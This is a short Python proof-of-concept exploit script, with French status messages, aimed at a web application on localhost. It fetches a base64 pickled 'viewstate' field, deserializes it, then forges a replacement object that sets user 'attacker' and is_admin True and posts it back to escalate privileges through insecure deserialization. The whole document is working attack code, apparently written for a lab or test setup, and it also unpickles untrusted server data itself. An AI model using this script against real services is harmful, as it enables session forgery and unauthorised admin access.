import re
import base64
import pickle
import requests

TARGET = "http://127.0.0.1:5000/"

def get_viewstate(session):
    r = session.get(TARGET)
    r.raise_for_status()
    m = re.search(r'name="viewstate"\s+value="([^"]+)"', r.text)
    if not m:
        raise RuntimeError("viewstate introuvable dans la page")
    return m.group(1)

def decode_viewstate(vs_b64):
    raw = base64.b64decode(vs_b64)
    obj = pickle.loads(raw)
    return obj

def post_viewstate(session, vs_b64):
    r = session.post(TARGET, data={"viewstate": vs_b64})
    r.raise_for_status()
    return r.text

def main():
    s = requests.Session()

    print("[+] Récupération du viewstate initial...")
    original_vs = get_viewstate(s)
    print("    base64 viewstate:", original_vs[:60], "..." )

    print("[+] Décodage & désérialisation")
    try:
        obj = decode_viewstate(original_vs)
        print("    Objet désérialisé :", obj)
    except Exception as e:
        print("    Erreur lors du decode/unpickle:", e)

    print("\n[+] Fabrication d'un viewstate contrôlé ")
    new_obj = {"user": "attacker", "note": "this proves we can control viewstate","is_admin":True}
    new_vs_b64 = base64.b64encode(pickle.dumps(new_obj)).decode()

    print("    viewstate forged (base64) :", new_vs_b64[:60], "...")
    print("[+] Envoi du viewstate forged au serveur")
    resp = post_viewstate(s, new_vs_b64)

    print("\n[+] Réponse serveur  :\n")
    print(resp)

if __name__ == "__main__":
    main()

